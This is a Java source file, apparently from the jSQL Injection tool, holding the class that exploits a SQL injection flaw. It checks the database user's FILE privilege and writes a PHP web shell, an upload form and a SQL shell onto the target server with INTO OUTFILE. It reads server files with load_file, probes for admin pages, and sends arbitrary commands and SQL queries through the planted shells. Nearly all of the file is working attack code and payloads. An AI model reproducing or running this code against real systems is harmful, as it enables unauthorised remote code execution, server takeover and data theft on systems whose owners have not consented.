/*******************************************************************************
 * Copyhacked (H) 2012-2014.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.ao;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.InjectionModel;
import com.jsql.model.StoppableLoopIntoResults;
import com.jsql.model.bean.Request;
import com.jsql.tool.ToolsString;
import com.jsql.view.MediatorGUI;
import com.jsql.view.list.dnd.ListItem;

/**
 * Ressource access object.
 * Get informations from file system, commands, webpage.
 */
public class RessourceAccessObject {
    /**
     * File name for web shell.
     */
    public static final String WEBSHELL_FILENAME
            = "j" + InjectionModel.JSQLVERSION + ".tmp1.php";
    
    /**
     * File name for upload form.
     */
    public static final String UPLOAD_FILENAME
            = "j" + InjectionModel.JSQLVERSION + ".tmp2.php";
    
    /**
     * File name for sql shell.
     */
    public static final String SQLSHELL_FILENAME
            = "j" + InjectionModel.JSQLVERSION + ".tmp3.php";
    
    /**
     * True if admin page sould stop, false otherwise.
     */
    public boolean endAdminSearch = false;
    
    /**
     * True if current user has right to read file. 
     */
    public boolean hasFileRight = false;
    
    /**
     * True if file search must stop, false otherwise.
     */
    public boolean endFileSearch = false;

    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(RessourceAccessObject.class);

    /**
     * Check if every page in the list responds 200 OK.
     * @param string
     * @param list List of admin pages ot test
     */
    public void getAdminPage(String string, List<ListItem> list) {
        String fin = string.replaceAll("^https?://[^/]*", "");
        String debut = string.replace(fin, "");
        String chemin = fin.replaceAll("[^/]*$", "");
        List<String> cheminArray = new ArrayList<String>();
        if (chemin.split("/").length == 0) {
            cheminArray.add("/");
        }
        for (String s: chemin.split("/")) {
            cheminArray.add(s + "/");
        }

        int nb = 0;
        String progressURL = "";
        ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
        CompletionService<CallableAdminPage> taskCompletionService
            = new ExecutorCompletionService<CallableAdminPage>(taskExecutor);
        for (String segment: cheminArray) {
            progressURL += segment;

            for (ListItem s: list) {
                taskCompletionService.submit(new CallableAdminPage(debut + progressURL + s.toString()));
            }
        }

        int submittedTasks = cheminArray.size() * list.size();
        for (int tasksHandled = 0; tasksHandled < submittedTasks
                && !this.endAdminSearch; tasksHandled++) {
            try {
                CallableAdminPage currentCallable = taskCompletionService.take().get();
                if (currentCallable.getResponseCodeHTTP() != null
                        && currentCallable.getResponseCodeHTTP().indexOf("200 OK") >= 0) {
                    Request request = new Request();
                    request.setMessage("CreateAdminPageTab");
                    request.setParameters(currentCallable.getUrl());
                    MediatorGUI.model().interact(request);

                    nb++;
                }
            } catch (InterruptedException e) {
                LOGGER.error(e, e);
            } catch (ExecutionException e) {
                LOGGER.error(e, e);
            }
        }

        taskExecutor.shutdown();
        try {
            taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            LOGGER.error(e, e);
        }

        this.endAdminSearch = false;

        LOGGER.info("Admin page(s) found: " + nb + "/" + submittedTasks);

        Request request = new Request();
        request.setMessage("EndAdminSearch");
        MediatorGUI.model().interact(request);
    }
    
    /**
     * Create a webshell in the server.
     * @param path Remote path othe file 
     * @param url
     * @throws PreparationException
     * @throws StoppableException
     */
    public void getShell(String path, String newUrl)
            throws PreparationException, StoppableException {
        if (!this.checkFilePrivilege()) {
            return;
        }

        MediatorGUI.model().inject(
            MediatorGUI.model().initialQuery.replaceAll(
                "1337" + MediatorGUI.model().visibleIndex + "7331",
                "(select+0x" + ToolsString.strhex("<SQLi><?php system($_GET['c']); ?><iLQS>") + ")"
            ).replaceAll("--++", "")
            + "+into+outfile+\"" + path + WEBSHELL_FILENAME + "\"--+"
        );

        String[] sourcePage = {""};
        String hexResult = new StoppableLoopIntoResults().action(
                "concat(hex(load_file(0x" + ToolsString.strhex(path + WEBSHELL_FILENAME) + ")),0x69)",
                sourcePage,
                false,
                1,
                null);

        if ("".equals(hexResult)) {
            MediatorGUI.model().sendResponseFromSite("Can't find web shell at " + path + WEBSHELL_FILENAME, sourcePage[0].trim());
            return;
        }

        String url = newUrl;
        if ("".equals(url)) {
            url = MediatorGUI.model().initialUrl.substring(0, MediatorGUI.model().initialUrl.lastIndexOf('/') + 1);
        }

        List<String> f = new ArrayList<String>();
        f.add(path.substring(path.lastIndexOf('/'), path.length()));
        if (ToolsString.hexstr(hexResult).indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1) {
            Request request = new Request();
            request.setMessage("CreateShellTab");
            request.setParameters(path, url);
            MediatorGUI.model().interact(request);
        } else {
            LOGGER.warn("Web shell not usable.");
        }
    }
    
    /**
     * Upload a file to the server.
     * @param path Remote path of the file to upload 
     * @param url URL of uploaded file
     * @param file File to upload
     * @throws PreparationException
     * @throws StoppableException
     */
    public void upload(String path, String newUrl, File file) throws PreparationException, StoppableException {
        if (!this.checkFilePrivilege()) {
            return;
        }
        
        String phpShell = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";

        MediatorGUI.model().inject(
                MediatorGUI.model().initialQuery.replaceAll(
                        "1337" + MediatorGUI.model().visibleIndex + "7331",
                        "(select+0x" + ToolsString.strhex("<SQLi>" + phpShell + "<iLQS>") + ")"
                ).replaceAll("--++", "")
                + "+into+outfile+\"" + path + UPLOAD_FILENAME + "\"--+"
        );

        String[] sourcePage = {""};
        String hexResult = new StoppableLoopIntoResults().action(
                "concat(hex(load_file(0x" + ToolsString.strhex(path + UPLOAD_FILENAME) + ")),0x69)",
                sourcePage,
                false,
                1,
                null);

        if ("".equals(hexResult)) {
            MediatorGUI.model().sendResponseFromSite("Can't find upload file at " + path + UPLOAD_FILENAME, sourcePage[0].trim());
            return;
        }

        String url = newUrl;
        if ("".equals(url)) {
            url = MediatorGUI.model().initialUrl.substring(0, MediatorGUI.model().initialUrl.lastIndexOf('/') + 1);
        }

        List<String> f = new ArrayList<String>();
        f.add(path.substring(path.lastIndexOf('/'), path.length()));
        if (ToolsString.hexstr(hexResult).indexOf(phpShell) > -1) {
            
            String crLf = "\r\n";
            URLConnection conn = null;
            OutputStream os = null;
            InputStream is = null;

            try {
                URL url2 = new URL(url + "/" + UPLOAD_FILENAME);
                conn = url2.openConnection();
                conn.setDoOutput(true);

                InputStream imgIs = new FileInputStream(file);
                byte[] imgData = new byte[imgIs.available()];
                imgIs.read(imgData);
                
                String message1 = "";
                message1 += "-----------------------------4664151417711" + crLf;
                message1 += "Content-Disposition: form-data; name=\"u\"; filename=\"" + file.getName() + "\"" + crLf;
                message1 += "Content-Type: binary/octet-stream" + crLf;
                message1 += crLf;

                String message2 = "";
                message2 += crLf + "-----------------------------4664151417711--" + crLf;

                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------4664151417711");
                conn.setRequestProperty("Content-Length", String.valueOf(message1.length() + message2.length() + imgData.length));

                os = conn.getOutputStream();
                os.write(message1.getBytes());

                int index = 0;
                int size = 1024;
                do {
                    if (index + size > imgData.length) {
                        size = imgData.length - index;
                    }
                    os.write(imgData, index, size);
                    index += size;
                } while (index < imgData.length);

                os.write(message2.getBytes());
                os.flush();

                is = conn.getInputStream();

                char buff = 512;
                int len;
                byte[] data = new byte[buff];
                String result = "";
                do {
                    len = is.read(data);

                    if (len > 0) {
                        result += new String(data, 0, len);
                    }
                } while (len > 0);

                imgIs.close();
                
                if (result.indexOf("SQLiy") > -1) {
                    LOGGER.info("Upload successful.");
                } else {
                    LOGGER.warn("Upload failed.");
                }
                
                Map<String, Object> msgHeader = new HashMap<String, Object>();
                msgHeader.put("Url", url);
                msgHeader.put("Cookie", "");
                msgHeader.put("Post", "");
                msgHeader.put("Header", "");
                msgHeader.put("Response", ToolsString.getHTTPHeaders(conn));

                Request request = new Request();
                request.setMessage("MessageHeader");
                request.setParameters(msgHeader);
                MediatorGUI.model().interact(request);
            } catch (Exception e) {
                LOGGER.error(e, e);
            } finally {
                try {
                    os.close();
                } catch (Exception e) {
                    LOGGER.error(e, e);
                }
                try {
                    is.close();
                } catch (Exception e) {
                    LOGGER.error(e, e);
                }
            }
        } else {
            LOGGER.warn("Upload not usable.");
        }
        
        Request request = new Request();
        request.setMessage("EndUpload");
        MediatorGUI.model().interact(request);
    }
    
    /**
     * Check if current user can read files.
     * @return True if user can read file, false otherwise
     * @throws PreparationException
     * @throws StoppableException
     */
    public boolean checkFilePrivilege() throws PreparationException, StoppableException {
        String[] sourcePage = {""};

        String hexResult = new StoppableLoopIntoResults().action(
                "concat((select+hex(if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") +
                "))from+INFORMATION_SCHEMA.USER_PRIVILEGES+where+grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)and+PRIVILEGE_TYPE=0x46494c45),0x69)", 
                sourcePage,
                false,
                1,
                null);

        if ("".equals(hexResult)) {
            MediatorGUI.model().sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
            Request request = new Request();
            request.setMessage("MarkFileSystemInvulnerable");
            MediatorGUI.model().interact(request);
            hasFileRight = false;
        } else if ("false".equals(ToolsString.hexstr(hexResult))) {
            LOGGER.warn("No FILE privilege");
            Request request = new Request();
            request.setMessage("MarkFileSystemInvulnerable");
            MediatorGUI.model().interact(request);
            hasFileRight = false;
        } else {
            Request request = new Request();
            request.setMessage("MarkFileSystemVulnerable");
            MediatorGUI.model().interact(request);
            hasFileRight = true;
        }
        
        return hasFileRight;
    }
    
    /**
     * Create a panel for each file in the list.
     * @param list List of file to read
     * @throws PreparationException
     * @throws StoppableException
     */
    public void getFile(List<ListItem> list) throws PreparationException, StoppableException {
        if (!checkFilePrivilege()) {
            return;
        }

        int nb = 0;
        ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
        CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<CallableFile>(taskExecutor);

        for (ListItem s: list) {
            taskCompletionService.submit(new CallableFile(s.toString()));
        }

        List<String> duplicate = new ArrayList<String>();
        int submittedTasks = list.size();
        for (int tasksHandled = 0; tasksHandled < submittedTasks && !endFileSearch; tasksHandled++) {
            try {
                CallableFile currentCallable = taskCompletionService.take().get();
                if (!"".equals(currentCallable.getFileSource())) {
                    String name = currentCallable.getUrl().substring(currentCallable.getUrl().lastIndexOf('/') + 1, currentCallable.getUrl().length());
                    String content = ToolsString.hexstr(currentCallable.getFileSource()).replace("\r", "");
                    String path = currentCallable.getUrl();

                    Request request = new Request();
                    request.setMessage("CreateFileTab");
                    request.setParameters(name, content, path);
                    MediatorGUI.model().interact(request);

                    if (!duplicate.contains(path.replace(name, ""))) {
                        LOGGER.info(
                                "Shell might be possible in folder "
                                + path.replace(name, ""));
                    }
                    duplicate.add(path.replace(name, ""));

                    nb++;
                }
            } catch (InterruptedException e) {
                LOGGER.error(e, e);
            } catch (ExecutionException e) {
                LOGGER.error(e, e);
            }
        }

        taskExecutor.shutdown();
        try {
            taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            LOGGER.error(e, e);
        }

        endFileSearch = false;

        LOGGER.info("File(s) found: " + nb + "/" + submittedTasks);
        Request request = new Request();
        request.setMessage("EndFileSearch");
        MediatorGUI.model().interact(request);
    }
    
    /**
     * Run a shell command on host.
     * @param cmd The command to execute
     * @param terminalID An unique identifier for terminal
     * @param wbhPath Web path of the shell
     */
    public void executeShell(String cmd, UUID terminalID, String wbhPath) {
        URLConnection connection;
        String result = "";
        try {
            String url = wbhPath + WEBSHELL_FILENAME + "?c=" + URLEncoder.encode(cmd.trim(), "ISO-8859-1");
            connection = new URL(url).openConnection();
            connection.setReadTimeout(60000);
            connection.setConnectTimeout(60000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line, pageSource = "";
            while ((line = reader.readLine()) != null) {
                pageSource += line + "\n";
            }
            reader.close();

            Matcher regexSearch = Pattern.compile("<SQLi>(.*)<iLQS>", Pattern.DOTALL).matcher(pageSource);
            regexSearch.find();

            result = regexSearch.group(1);
            
            Map<String, Object> msgHeader = new HashMap<String, Object>();
            msgHeader.put("Url", url);
            msgHeader.put("Cookie", "");
            msgHeader.put("Post", "");
            msgHeader.put("Header", "");
            msgHeader.put("Response", ToolsString.getHTTPHeaders(connection));
            
            Request request = new Request();
            request.setMessage("MessageHeader");
            request.setParameters(msgHeader);
            MediatorGUI.model().interact(request);
        } catch (MalformedURLException e) {
            LOGGER.error(e, e);
        } catch (IOException e) {
            LOGGER.error(e, e);
        } finally {
            // Unfroze interface
            Request request = new Request();
            request.setMessage("GetShellResult");
            request.setParameters(terminalID, result, cmd);
            MediatorGUI.model().interact(request);
        }
    }

    /**
     * Create SQL shell on the server. Override user name and password eventually.
     * @param path Script to create on the server
     * @param url URL for the script (used for url rewriting)
     * @param user User name for current database
     * @param pass User password for current database
     * @throws PreparationException
     * @throws StoppableException
     */
    public void getSQLShell(String path, String newUrl, String user, String pass) throws PreparationException, StoppableException {
        if (!this.checkFilePrivilege()) {
            return;
        }
        
        String s = "<SQLi><?php mysql_connect('localhost',$_GET['u'],$_GET['p']);" +
"$result=mysql_query($r=$_GET['q'])or die('<SQLe>Query failed: '.mysql_error().'<iLQS>');" +
"if(is_resource($result)){" +
    "echo'<SQLr>';" +
    "while($row=mysql_fetch_array($result,MYSQL_NUM))echo'<tr><td>',join('</td><td>',$row),'</td></tr>';" +
"}else if($result==TRUE)echo'<SQLm>Query OK: ',mysql_affected_rows(),' row(s) affected';" +
"else if($result==FALSE)echo'<SQLm>Query failed';" +
                " ?><iLQS>";

        MediatorGUI.model().inject(
                MediatorGUI.model().initialQuery.replaceAll("1337" + MediatorGUI.model().visibleIndex + "7331", "(select+0x" + ToolsString.strhex(s) + ")").replaceAll("--++", "") +
                "+into+outfile+\"" + path + SQLSHELL_FILENAME + "\"--+"
                );

        String[] sourcePage = {""};
        String hexResult = new StoppableLoopIntoResults().action(
                "concat(hex(load_file(0x" + ToolsString.strhex(path + SQLSHELL_FILENAME) + ")),0x69)",
                sourcePage,
                false,
                1,
                null);

        if ("".equals(hexResult)) {
            MediatorGUI.model().sendResponseFromSite("Can't find SQL shell at " + path + SQLSHELL_FILENAME, sourcePage[0].trim());
            return;
        }
        
        String url = newUrl;
        if ("".equals(url)) {
            url = MediatorGUI.model().initialUrl.substring(0, MediatorGUI.model().initialUrl.lastIndexOf('/') + 1);
        }

        List<String> f = new ArrayList<String>();
        f.add(path.substring(path.lastIndexOf('/'), path.length()));
        if (ToolsString.hexstr(hexResult).indexOf(s) > -1) {
            Request request = new Request();
            request.setMessage("CreateSQLShellTab");
            request.setParameters(path, url, user, pass);
            MediatorGUI.model().interact(request);
        } else {
            LOGGER.warn("SQL shell not usable.");
        }
    }

    /**
     * Execute SQL request into terminal defined by URL path, eventually override with database user/pass identifiers.
     * @param cmd SQL request to execute
     * @param terminalID Identifier of terminal sending the request
     * @param wbhPath URL to send SQL request against
     * @param user User name [optional]
     * @param pass USEr password [optional]
     */
    public void executeSQLShell(String cmd, UUID terminalID, String wbhPath, String user, String pass) {
        URLConnection connection;
        String result = "";
        try {
            String url = wbhPath + SQLSHELL_FILENAME + "?q=" + URLEncoder.encode(cmd.trim(), "ISO-8859-1") + "&u=" + user + "&p=" + pass;
            connection = new URL(url).openConnection();
            connection.setReadTimeout(60000);
            connection.setConnectTimeout(60000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line, pageSource = "";
            while ((line = reader.readLine()) != null) {
                pageSource += line + "\n";
            }
            reader.close();

            Matcher regexSearch = Pattern.compile("<SQLi>(.*)<iLQS>", Pattern.DOTALL).matcher(pageSource);
            regexSearch.find();
            
            result = regexSearch.group(1);
            
            Map<String, Object> msgHeader = new HashMap<String, Object>();
            msgHeader.put("Url", url);
            msgHeader.put("Cookie", "");
            msgHeader.put("Post", "");
            msgHeader.put("Header", "");
            msgHeader.put("Response", ToolsString.getHTTPHeaders(connection));
            
            Request request = new Request();
            request.setMessage("MessageHeader");
            request.setParameters(msgHeader);
            MediatorGUI.model().interact(request);
        } catch (MalformedURLException e) {
            LOGGER.error(e, e);
        } catch (IOException e) {
            LOGGER.error(e, e);
        } finally {
            // Unfroze interface
            Request request = new Request();
            request.setMessage("GetSQLShellResult");
            request.setParameters(terminalID, result, cmd);
            MediatorGUI.model().interact(request);
        }
    }
}
